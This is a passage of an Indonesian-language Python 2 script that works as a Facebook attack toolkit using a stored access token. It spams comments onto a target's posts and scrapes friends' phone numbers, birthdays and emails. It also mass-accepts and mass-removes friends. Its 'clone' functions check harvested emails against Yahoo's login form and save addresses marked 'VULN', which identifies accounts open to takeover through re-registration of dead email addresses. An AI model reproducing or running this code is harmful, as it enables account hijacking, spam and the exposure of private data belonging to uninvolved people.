	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	
##### BOT KOMEN #####
def bot_komen():
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;97m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;97m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
        tar = raw_input('\x1b[1;97m[+] \x1b[1;92mInput id target \x1b[1;91m: \x1b[1;97m')
        komen = raw_input('\x1b[1;97m[?] \x1b[1;92mComment \x1b[1;91m: \x1b[1;97m')
        try:
            oh = requests.get('https://graph.facebook.com/' + tar + '?access_token=' + token)
            yes = json.loads(oh.text)
            p = requests.get('https://graph.facebook.com/v3.0/' + yes['id'] + '?fields=feed.limit(50)&access_token=' + token)
            a = json.loads(p.text)
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                z = s['id']
                km.append(z)
                requests.post('https://graph.facebook.com/' + z + '/comments?message=' + komen + '&access_token=' + token)
                print '\x1b[1;97m[ \x1b[1;92m' + komen[:10].replace('\n', ' ') + '... \x1b[1;97m] ' + z
                print 42 * '\x1b[1;97m\xe2\x95\x90'

            print '\r\x1b[1;97m[+]\x1b[1;92m Done \x1b[1;97m...'
            raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
            menu()
        except KeyError:
            print '\x1b[1;97m[!] \x1b[1;91mId not found'
            raw_input('\n\x1b[1;97m[\x1b[1;92mBack\x1b[1;97m]')
            menu()

def dumpge():
	os.system("clear")
	token=open("login.txt","r").read()
	print logo
	aid = raw_input('\033[1;96m[+]\033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
	jalan('\033[1;96m[+]\033[1;93mSearching \033[1;97m...')
	print'[+]CTRZ + x Untuk Berhenti'
	print ' '
	ks = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	xop = json.loads(ks.text)
	for ox in xop["data"]:
		uxp = requests.get('https://graph.facebook.com/' + ox["id"] + '?access_token=' + token)
		pal = json.loads(uxp.text)
		try:
			
			print "[+]\033[33mNama : %s"%(pal["name"])
			print "\033[37m======================================"
			print "[+]\033[32mNumb : %s"%(pal["mobile_phone"])
			
			
			
		except KeyError:
			pass
	print "[+] Succesfuly Dump Gender"
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def getlahir():
	os.system("clear")
	token=open("login.txt","r").read()
	print logo
	aid = raw_input('\033[1;96m[+]\033[1;93mMasukan ID/Nama\033[1;91m : \033[1;97m')
	jalan('\033[1;96m[+]\033[1;93mSearching \033[1;97m...')
	kuk = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
	pul = json.loads(kuk.text)
	for jsonm in pul["data"]:
		by = requests.get('https://graph.facebook.com/' + jsonm["id"] + '?access_token=' + token)
		hek = json.loads(by.text)
		try:
	
			print "[+]\033[32mNama   : %s"%(hek["name"])
			print "\033[37m======================================"
			print "[+]\033[32mTangal : %s"%(hek["birthday"])
		except: pass
	print "[+] Succesfuly"
	raw_input("\033[34m[\033[33;1m/\033[34m] \033[0;1mBack >> ")
	menu()
def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print '\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;90mClone From friend'
	print '\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;90mClone From ID friend'
	print '\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;90mClone From Group'
	
	print '\x1b[1;93m[\x1b[1;91m0\x1b[1;93m] \x1b[1;90mExit'
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		

def clone_dari_daftar_teman():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
					save = open('out/MailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/MailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
		

def clone_dari_teman():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 43*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/TemanMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	

def clone_dari_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;96m[+] \033[1;93mNama File \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				print("\033[1;96m[✓] \033[1;92mVULN")
				print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
				save = open('out/MailVuln.txt','a')
				save.write("Email: "+ mail + '\n\n')
				save.close()
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
def informasi():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;92m="
	aid = raw_input('\033[1;96m[+] Input Name or ID :\033[1;97m')
	jalan('\033[1;96m[+] \033[1;95mSearching \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 43*"\033[1;96m="
			try:
				print '\033[1;96m[+] \033[1;93mNama\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[+] \033[1;93mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
			try:
				print '\033[1;96m[+] \033[1;93mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
			
			raw_input(tutup + '\nEnter returns to the menu ...')
			menu()
		else:
			pass
	else:
		print"\033[1;96m[!] \x1b[1;91mResult Not found"
		raw_input("\n\033[1;96m[\033[1;97m[!] Press [Enter] To Return\033[1;96m]")
		menu()
def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m=> \x1b[1;91mToken not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m\x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;97m[!]\x1b[1;91mNot found :( Friend Requests'
        raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
        menu()
    jalan('\x1b[1;97m=> \x1b[1;92mWaiting \x1b[1;97m...')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
            print 40 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 40 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;97m=> \x1b[1;91mDone'
    raw_input('\n\x1b[1;97m=> \x1b[1;97mBack \x1b[1;91m]')
    menu()
def unfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu()
login()

